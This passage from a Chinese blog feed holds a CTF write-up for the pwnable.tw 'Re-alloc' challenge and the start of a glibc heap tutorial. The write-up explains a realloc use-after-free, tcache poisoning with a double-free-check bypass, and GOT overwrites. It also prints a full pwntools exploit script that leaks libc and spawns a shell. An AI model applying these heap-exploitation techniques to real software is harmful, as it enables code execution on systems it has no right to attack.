class="line">$$$$$$$$$$$$$$$$$$$$$$$$$$$$</span><br><span class="line">$   1. Alloc               $</span><br><span class="line">$   2. Realloc             $</span><br><span class="line">$   3. Free                $</span><br><span class="line">$   4. Exit                $</span><br><span class="line">$$$$$$$$$$$$$$$$$$$$$$$$$$$</span><br></pre></td></tr></table></figure><ol><li>Alloc: index只能取0或1；size必须&lt;=0x78；然后使用<code>realloc(0, size)</code>分配，通过源码可以看出，这就相当于<code>malloc(size)</code>。这里存在null byte overflow（然而没什么用似乎，一开始我一直卡在这里想如何利用，完全没注意到后一个漏洞。。。</li></ol><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* realloc of null is supposed to be same as malloc */</span></span><br><span class="line"><span class="keyword">if</span> (oldmem == <span class="number">0</span>)</span><br><span class="line">    <span class="keyword">return</span> __libc_malloc (bytes);</span><br></pre></td></tr></table></figure><ol start="2"><li>Realloc: size同样&lt;=0x78。realloc有几种情况：请求大小自己可以满足；尝试向后扩展(top chunk或!inuse (next))；<code>__int_malloc</code>请求新块。（这里存在UAF，输入size为0</li><li>Free：<code>realloc(ptr, 0)</code>相当于<code>free(ptr)</code>，同时将指针数组置空。</li></ol><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (bytes == <span class="number">0</span> &amp;&amp; oldmem != <span class="literal">NULL</span>)</span><br><span class="line">&#123;</span><br><span class="line">    __libc_free (oldmem); <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>libc_version: glibc 2.29 with tcache。该版本libc的<a href="https://launchpad.net/ubuntu/+source/glibc/2.29-0ubuntu2">源码</a>。下一篇文章说一下如何确定的libc版本，如何确定的有tcache，以及如何使用指定libc运行程序。</p><p>此外，这个版本中出现了对tcache double free的一个<a href="https://hhdx.xyz/2020/08/01/How2heap%E6%80%BB%E7%BB%93/#fastbin-dup">检查机制</a>。</p><a id="more"></a><h2 id="总体思路"><a href="#总体思路" class="headerlink" title="总体思路"></a>总体思路</h2><p>用类似fastbin attack的方式伪造tcache，将atoll_got放入到两个大小的tcache链表上。</p><p>第一次利用其中一个将期修改为printf_got，在<code>read_long</code>中构造format string vulnerability，泄露栈上的<code>__libc_start_main</code>地址，也就是main函数的返回地址。</p><p>第二次将atoll_got修改为system地址，输入/bin/sh执行。</p><h2 id="伪造tcache-chunk"><a href="#伪造tcache-chunk" class="headerlink" title="伪造tcache chunk"></a>伪造tcache chunk</h2><p>只要满足以下条件就会使用tcache，可以发现并没有对counts进行检查，只要非空就会进行分配。同样<code>tcache_get</code>里也只是<code>--(tcache-&gt;counts[tc_idx])</code>，没有检查。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (tc_idx &lt; mp_.tcache_bins</span><br><span class="line">      <span class="comment">/*&amp;&amp; tc_idx &lt; TCACHE_MAX_BINS*/</span> <span class="comment">/* to appease gcc */</span></span><br><span class="line">      &amp;&amp; tcache</span><br><span class="line">      &amp;&amp; tcache-&gt;entries[tc_idx] != <span class="literal">NULL</span>)</span><br><span class="line">&#123;</span><br><span class="line">      <span class="keyword">return</span> tcache_get (tc_idx);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>伪造</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">allocate(<span class="number">0</span>, <span class="number">0x18</span>, <span class="string">&quot;A&quot;</span>)</span><br><span class="line">realloc(<span class="number">0</span>, <span class="number">0</span>, <span class="string">&quot;&quot;</span>)                 <span class="comment"># free</span></span><br><span class="line">realloc(<span class="number">0</span>, <span class="number">0x18</span>, p64(atoll_got))  <span class="comment"># 修改next</span></span><br><span class="line">allocate(<span class="number">1</span>, <span class="number">0x18</span>, <span class="string">&quot;A&quot;</span>)            <span class="comment"># 重新分配出来，使得atoll_got打头，此时counts=0，但并不妨碍</span></span><br><span class="line">realloc(<span class="number">0</span>, <span class="number">0x28</span>, <span class="string">&quot;A&quot;</span>)             <span class="comment"># 使其向后扩展，从top chunk中切割</span></span><br><span class="line">free(<span class="number">0</span>)                           <span class="comment"># 第一次放进0x30 tcache</span></span><br><span class="line">realloc(<span class="number">1</span>, <span class="number">0x28</span>, <span class="string">&quot;A&quot;</span>*<span class="number">0x10</span>)        <span class="comment"># 覆盖key，绕过double free检查</span></span><br><span class="line">free(<span class="number">1</span>)                           <span class="comment"># 第二次放进0x30 tcache</span></span><br></pre></td></tr></table></figure><p>用同样的方法，再伪造一个</p><h2 id="get-shell"><a href="#get-shell" class="headerlink" title="get shell"></a>get shell</h2><p>atoll_got修改为printf_plt，构造format string vulnerability</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">allocate(<span class="number">0</span>, <span class="number">0x18</span>, p64(printf_plt))        <span class="comment"># 修改atoll_got为printf_plt</span></span><br><span class="line">io.sendlineafter(<span class="string">&quot;Your choice: &quot;</span>, <span class="string">&quot;1&quot;</span>)</span><br><span class="line">io.sendlineafter(<span class="string">&quot;Index:&quot;</span>, <span class="string">&quot;Z%23$llx\n&quot;</span>)  <span class="comment"># 泄露 __libc_start_main</span></span><br><span class="line">io.recvuntil(<span class="string">&quot;Z&quot;</span>)</span><br><span class="line">libc_base = int(io.recvline().strip(<span class="string">b&quot;\n&quot;</span>), <span class="number">16</span>) - <span class="number">0x26B6B</span></span><br></pre></td></tr></table></figure><p>修改atoll_got为system，get shell</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">io.sendlineafter(<span class="string">&quot;Your choice: &quot;</span>, <span class="string">&quot;1&quot;</span>)</span><br><span class="line"><span class="comment"># gdb.attach(io, &quot;b read_long&quot;)</span></span><br><span class="line">io.sendlineafter(<span class="string">&quot;Index:&quot;</span>, <span class="string">&quot;A\x00&quot;</span>)       <span class="comment"># 相当于输入1</span></span><br><span class="line">io.sendlineafter(<span class="string">&quot;Size:&quot;</span>, <span class="string">&quot;%55x&quot;</span>)         <span class="comment"># 相当于输入0x38</span></span><br><span class="line">io.sendlineafter(<span class="string">&quot;Data:&quot;</span>, p64(system_addr))</span><br><span class="line"></span><br><span class="line">io.sendlineafter(<span class="string">&quot;Your choice: &quot;</span>, <span class="string">&quot;1&quot;</span>)</span><br><span class="line">io.sendlineafter(<span class="string">&quot;Index:&quot;</span>, <span class="string">&quot;/bin/sh&quot;</span>)</span><br></pre></td></tr></table></figure><h2 id="exploit"><a href="#exploit" class="headerlink" title="exploit"></a>exploit</h2><p><a href="https://github.com/clxsh/ctf_wps/blob/master/pwnable.tw/Re-alloc/exp.py">exp</a></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context(os=<span class="string">&quot;linux&quot;</span>, arch=<span class="string">&quot;amd64&quot;</span>, log_level=<span class="string">&quot;debug&quot;</span>)</span><br><span class="line">localfile = <span class="string">&quot;./re-alloc&quot;</span></span><br><span class="line">locallibc = <span class="string">&quot;libc.so.6&quot;</span></span><br><span class="line">pf      = <span class="keyword">lambda</span> name,num           :log.info(name + <span class="string">&quot;: 0x%x&quot;</span> % num)</span><br><span class="line">g       = <span class="keyword">lambda</span> x                  :next(libc.search(asm(x)))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">allocate</span>(<span class="params">idx, size, data</span>):</span></span><br><span class="line">    io.recvuntil(<span class="string">&quot;Your choice: &quot;</span>)</span><br><span class="line">    io.sendline(<span class="string">&quot;1&quot;</span>)</span><br><span class="line">    io.recvuntil(<span class="string">&quot;Index:&quot;</span>)</span><br><span class="line">    io.sendline(str(idx))</span><br><span class="line">    io.recvuntil(<span class="string">&quot;Size:&quot;</span>)</span><br><span class="line">    io.sendline(str(size))</span><br><span class="line">    io.recvuntil(<span class="string">&quot;Data:&quot;</span>)</span><br><span class="line">    io.send(data)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">realloc</span>(<span class="params">idx, size, data</span>):</span></span><br><span class="line">    io.recvuntil(<span class="string">&quot;Your choice: &quot;</span>)</span><br><span class="line">    io.sendline(<span class="string">&quot;2&quot;</span>)</span><br><span class="line">    io.recvuntil(<span class="string">&quot;Index:&quot;</span>)</span><br><span class="line">    io.sendline(str(idx))</span><br><span class="line">    io.recvuntil(<span class="string">&quot;Size:&quot;</span>)</span><br><span class="line">    io.sendline(str(size))</span><br><span class="line">    <span class="keyword">if</span> size != <span class="number">0</span>:</span><br><span class="line">        io.recvuntil(<span class="string">&quot;Data:&quot;</span>)</span><br><span class="line">        io.send(data)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">free</span>(<span class="params">idx</span>):</span></span><br><span class="line">    io.recvuntil(<span class="string">&quot;Your choice: &quot;</span>)</span><br><span class="line">    io.sendline(<span class="string">&quot;3&quot;</span>)</span><br><span class="line">    io.recvuntil(<span class="string">&quot;Index:&quot;</span>)</span><br><span class="line">    io.sendline(str(idx))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">exp</span>():</span></span><br><span class="line">    atoll_got = elf.got[<span class="string">&quot;atoll&quot;</span>]</span><br><span class="line">    printf_plt = elf.plt[<span class="string">&quot;printf&quot;</span>]</span><br><span class="line">    system_off = libc.sym[<span class="string">&quot;system&quot;</span>]</span><br><span class="line"></span><br><span class="line">    allocate(<span class="number">0</span>, <span class="number">0x18</span>, <span class="string">&quot;A&quot;</span>)</span><br><span class="line">    realloc(<span class="number">0</span>, <span class="number">0</span>, <span class="string">&quot;&quot;</span>)</span><br><span class="line">    realloc(<span class="number">0</span>, <span class="number">0x18</span>, p64(atoll_got))</span><br><span class="line">    allocate(<span class="number">1</span>, <span class="number">0x18</span>, <span class="string">&quot;A&quot;</span>)</span><br><span class="line">    realloc(<span class="number">0</span>, <span class="number">0x28</span>, <span class="string">&quot;A&quot;</span>)</span><br><span class="line">    free(<span class="number">0</span>)</span><br><span class="line">    realloc(<span class="number">1</span>, <span class="number">0x28</span>, <span class="string">&quot;A&quot;</span>*<span class="number">0x10</span>)</span><br><span class="line">    free(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">    allocate(<span class="number">0</span>, <span class="number">0x38</span>, <span class="string">&quot;A&quot;</span>)</span><br><span class="line">    realloc(<span class="number">0</span>, <span class="number">0</span>, <span class="string">&quot;&quot;</span>)</span><br><span class="line">    realloc(<span class="number">0</span>, <span class="number">0x38</span>, p64(atoll_got))</span><br><span class="line">    allocate(<span class="number">1</span>, <span class="number">0x38</span>, <span class="string">&quot;A&quot;</span>)</span><br><span class="line">    realloc(<span class="number">0</span>, <span class="number">0x48</span>, <span class="string">&quot;A&quot;</span>)</span><br><span class="line">    free(<span class="number">0</span>)</span><br><span class="line">    realloc(<span class="number">1</span>, <span class="number">0x48</span>, <span class="string">&quot;A&quot;</span>*<span class="number">0x10</span>)</span><br><span class="line">    free(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">    allocate(<span class="number">0</span>, <span class="number">0x18</span>, p64(printf_plt))</span><br><span class="line">    io.sendlineafter(<span class="string">&quot;Your choice: &quot;</span>, <span class="string">&quot;1&quot;</span>)</span><br><span class="line">    io.sendlineafter(<span class="string">&quot;Index:&quot;</span>, <span class="string">&quot;Z%23$llx\n&quot;</span>)</span><br><span class="line">    io.recvuntil(<span class="string">&quot;Z&quot;</span>)</span><br><span class="line">    libc_base = int(io.recvline().strip(<span class="string">b&quot;\n&quot;</span>), <span class="number">16</span>) - <span class="number">0x26B6B</span></span><br><span class="line">    pf(<span class="string">&quot;libc base&quot;</span>, libc_base)</span><br><span class="line">    system_addr = libc_base + system_off</span><br><span class="line"></span><br><span class="line">    io.sendlineafter(<span class="string">&quot;Your choice: &quot;</span>, <span class="string">&quot;1&quot;</span>)</span><br><span class="line">    <span class="comment"># gdb.attach(io, &quot;b read_long&quot;)</span></span><br><span class="line">    io.sendlineafter(<span class="string">&quot;Index:&quot;</span>, <span class="string">&quot;A\x00&quot;</span>)</span><br><span class="line">    io.sendlineafter(<span class="string">&quot;Size:&quot;</span>, <span class="string">&quot;%55x&quot;</span>)</span><br><span class="line">    io.sendlineafter(<span class="string">&quot;Data:&quot;</span>, p64(system_addr))</span><br><span class="line"></span><br><span class="line">    io.sendlineafter(<span class="string">&quot;Your choice: &quot;</span>, <span class="string">&quot;1&quot;</span>)</span><br><span class="line">    io.sendlineafter(<span class="string">&quot;Index:&quot;</span>, <span class="string">&quot;/bin/sh&quot;</span>)</span><br><span class="line">    </span><br><span class="line">    io.interactive()</span><br><span class="line"></span><br><span class="line">argc = len(sys.argv)</span><br><span class="line"><span class="keyword">if</span> argc == <span class="number">1</span>:</span><br><span class="line">    io = process(localfile)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    <span class="keyword">if</span> argc == <span class="number">2</span>:</span><br><span class="line">        host, port = sys.argv[<span class="number">1</span>].split(<span class="string">&quot;:&quot;</span>)</span><br><span class="line">    <span class="keyword">elif</span> argc == <span class="number">3</span>:</span><br><span class="line">        host = sys.argv[<span class="number">1</span>]</span><br><span class="line">        port = sys.argv[<span class="number">2</span>]</span><br><span class="line">    io = remote(host, port)</span><br><span class="line"></span><br><span class="line">elf = ELF(localfile)</span><br><span class="line">libc = ELF(locallibc)</span><br><span class="line">exp()</span><br></pre></td></tr></table></figure><h2 id="reference"><a href="#reference" class="headerlink" title="reference"></a>reference</h2><ol><li><a href="https://n0nop.com/2020/03/06/pwn-heap-re-alloc/">https://n0nop.com/2020/03/06/pwn-heap-re-alloc/</a></li></ol>]]></content>
    
    
    <summary type="html">&lt;h2 id=&quot;题目分析&quot;&gt;&lt;a href=&quot;#题目分析&quot; class=&quot;headerlink&quot; title=&quot;题目分析&quot;&gt;&lt;/a&gt;题目分析&lt;/h2&gt;&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;6&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;Arch:     amd64-64-little&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;RELRO:    Partial RELRO&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;Stack:    Canary found&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;NX:       NX enabled&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;PIE:      No PIE (0x400000)&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;FORTIFY:  Enabled&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;

&lt;p&gt;是一个典型的菜单类程序&lt;/p&gt;
&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;8&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;$$$$$$$$$$$$$$$$$$$$$$$$$$$$&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;🍊      RE Allocator      🍊&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;$$$$$$$$$$$$$$$$$$$$$$$$$$$$&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;$   1. Alloc               $&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;$   2. Realloc             $&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;$   3. Free                $&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;$   4. Exit                $&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;$$$$$$$$$$$$$$$$$$$$$$$$$$$&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;

&lt;ol&gt;
&lt;li&gt;Alloc: index只能取0或1；size必须&amp;lt;=0x78；然后使用&lt;code&gt;realloc(0, size)&lt;/code&gt;分配，通过源码可以看出，这就相当于&lt;code&gt;malloc(size)&lt;/code&gt;。这里存在null byte overflow（然而没什么用似乎，一开始我一直卡在这里想如何利用，完全没注意到后一个漏洞。。。&lt;/li&gt;
&lt;/ol&gt;
&lt;figure class=&quot;highlight c&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;comment&quot;&gt;/* realloc of null is supposed to be same as malloc */&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;if&lt;/span&gt; (oldmem == &lt;span class=&quot;number&quot;&gt;0&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &lt;span class=&quot;keyword&quot;&gt;return&lt;/span&gt; __libc_malloc (bytes);&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;

&lt;ol start=&quot;2&quot;&gt;
&lt;li&gt;Realloc: size同样&amp;lt;=0x78。realloc有几种情况：请求大小自己可以满足；尝试向后扩展(top chunk或!inuse (next))；&lt;code&gt;__int_malloc&lt;/code&gt;请求新块。（这里存在UAF，输入size为0&lt;/li&gt;
&lt;li&gt;Free：&lt;code&gt;realloc(ptr, 0)&lt;/code&gt;相当于&lt;code&gt;free(ptr)&lt;/code&gt;，同时将指针数组置空。&lt;/li&gt;
&lt;/ol&gt;
&lt;figure class=&quot;highlight c&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;4&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;if&lt;/span&gt; (bytes == &lt;span class=&quot;number&quot;&gt;0&lt;/span&gt; &amp;amp;&amp;amp; oldmem != &lt;span class=&quot;literal&quot;&gt;NULL&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    __libc_free (oldmem); &lt;span class=&quot;keyword&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;number&quot;&gt;0&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;

&lt;p&gt;libc_version: glibc 2.29 with tcache。该版本libc的&lt;a href=&quot;https://launchpad.net/ubuntu/+source/glibc/2.29-0ubuntu2&quot;&gt;源码&lt;/a&gt;。下一篇文章说一下如何确定的libc版本，如何确定的有tcache，以及如何使用指定libc运行程序。&lt;/p&gt;
&lt;p&gt;此外，这个版本中出现了对tcache double free的一个&lt;a href=&quot;https://hhdx.xyz/2020/08/01/How2heap%E6%80%BB%E7%BB%93/#fastbin-dup&quot;&gt;检查机制&lt;/a&gt;。&lt;/p&gt;</summary>
    
    
    
    
    <category term="CTF" scheme="http://hhdx.xyz/tags/CTF/"/>
    
  </entry>
  
  <entry>
    <title>glibc heap 整理</title>
    <link href="http://hhdx.xyz/2020/08/02/glibcheap/"/>
    <id>http://hhdx.xyz/2020/08/02/glibcheap/</id>
    <published>2020-08-02T04:51:56.000Z</published>
    <updated>2020-11-30T04:59:26.880Z</updated>
    
    <content type="html"><![CDATA[<p>目前 Linux 标准发行版中使用的堆分配器是 glibc 中的堆分配器：ptmalloc2。ptmalloc2 主要是通过 malloc/free 函数来分配和释放内存块。</p><p>需要注意的是，在内存分配与使用的过程中，Linux 有这样的一个基本内存管理思想，<strong>只有当真正访问一个地址的时候，系统才会建立虚拟页面与物理页面的映射关系</strong>。</p><h2 id="基本操作"><a href="#基本操作" class="headerlink" title="基本操作"></a>基本操作</h2><h3 id="malloc"><a href="#malloc" class="headerlink" title="malloc"></a>malloc</h3><p><code>malloc(size_t n)</code></p><ul><li>当 n=0 时，返回当前系统允许的堆的最小内存块。</li><li>当 n 为负数时，由于在大多数系统上，<strong>size_t 是无符号数（这一点非常重要）</strong>，所以程序就会申请很大的内存空间，但通常来说都会失败，因为系统没有那么多的内存可以分配。</li></ul><h3 id="free"><a href="#free" class="headerlink" title="free"></a>free</h3><p><code>free(void *p)</code></p><ul><li><strong>当 p 为空指针时，函数不执行任何操作。</strong></li><li>当 p 已经被释放之后，再次释放会出现乱七八糟的效果，这其实就是 <code>double free</code>。</li><li>除了被禁用 (mallopt) 的情况下，当释放很大的内存空间时，程序会将这些内存空间还给系统，以便于减小程序所使用的内存空间。</li></ul><h2 id="背后的系统调用"><a href="#背后的系统调用" class="headerlink" title="背后的系统调用"></a>背后的系统调用</h2><p>这些函数背后的系统调用主要是 <a href="http://man7.org/linux/man-pages/man2/sbrk.2.html">(s)brk</a> 函数以及 <a href="http://man7.org/linux/man-pages/man2/mmap.2.html">mmap, munmap</a> 函数。</p><a id="more"></a><p><img src="https://raw.githubusercontent.com/lc1838228782/pics/master/img/brk%26mmap.png"></p><p>初始时，堆的起始地址 <a href="http://elixir.free-electrons.com/linux/v3.8/source/include/linux/mm_types.h#L365">start_brk</a> 以及堆的当前末尾 <a href="http://elixir.free-electrons.com/linux/v3.8/source/include/linux/mm_types.h#L365">brk</a> 指向同一地址。根据是否开启 ASLR，两者的具体位置会有所不同</p><ul><li>不开启 ASLR 保护时，start_brk 以及 brk 会指向 data/bss 段的结尾。</li><li>开启 ASLR 保护时，start_brk 以及 brk 也会指向同一位置，只是这个位置是在 data/bss 段结尾后的随机偏移处。</li></ul><p>具体效果如下图</p><p><img src="https://raw.githubusercontent.com/lc1838228782/pics/master/img/program_virtual_address_memory_space.png"></p><h3 id="brk-sbrk"><a href="#brk-sbrk" class="headerlink" title="brk,sbrk"></a>brk,sbrk</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">brk</span><span class="params">(<span class="keyword">void</span> * addr)</span></span>; </span><br><span class="line"><span class="comment">/* brk调整program break位置，参数为break的新地址。</span></span><br><span class="line"><span class="comment">brk成功返回0，失败返回-1</span></span><br><span class="line"><span class="comment">并设置errno值为ENOMEM */</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> * <span class="title">sbrk</span><span class="params">(<span class="keyword">intptr_t</span> increment)</span></span>;</span><br><span class="line"><span class="comment">/* sbrk通过increment的正负调整break位置，</span></span><br><span class="line"><span class="comment">sbrk成功返回原brk的地址，也就是新分配内存的起始位置，失败返回(void *)-1,</span></span><br><span class="line"><span class="comment">并设置errno全局变量的值为ENOMEM */</span></span><br></pre></td></tr></table></figure><h3 id="mmap-munmap"><a href="#mmap-munmap" class="headerlink" title="mmap,munmap"></a>mmap,munmap</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#incldue<span class="meta-string">&lt;sys/mman.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">void</span> * <span class="title">mmap</span><span class="params">(<span class="keyword">void</span> * addr, <span class="keyword">size_t</span> length,<span class="keyword">int</span> prot,<span class="keyword">int</span> flags,<span class="keyword">int</span> fd,<span class="keyword">off_t</span> offset)</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">munmap</span><span class="params">(<span class="keyword">void</span> * addr, <span class="keyword">size_t</span> length)</span></span>;<span class="comment">//addr为mmap函数返回接收的地址，length为请求分配的长度。</span></span><br></pre></td></tr></table></figure><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span 